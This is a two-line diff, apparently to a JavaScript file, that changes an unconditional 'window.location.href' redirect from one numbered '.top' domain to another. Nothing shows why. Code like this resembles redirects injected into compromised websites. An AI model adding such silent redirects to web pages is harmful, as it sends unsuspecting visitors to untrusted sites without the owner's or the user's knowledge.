@@ -1,2 +1,3 @@
-window.location.href = "https://ccc7211.top";
+window.location.href = "https://ccc6568.top/";
+
 
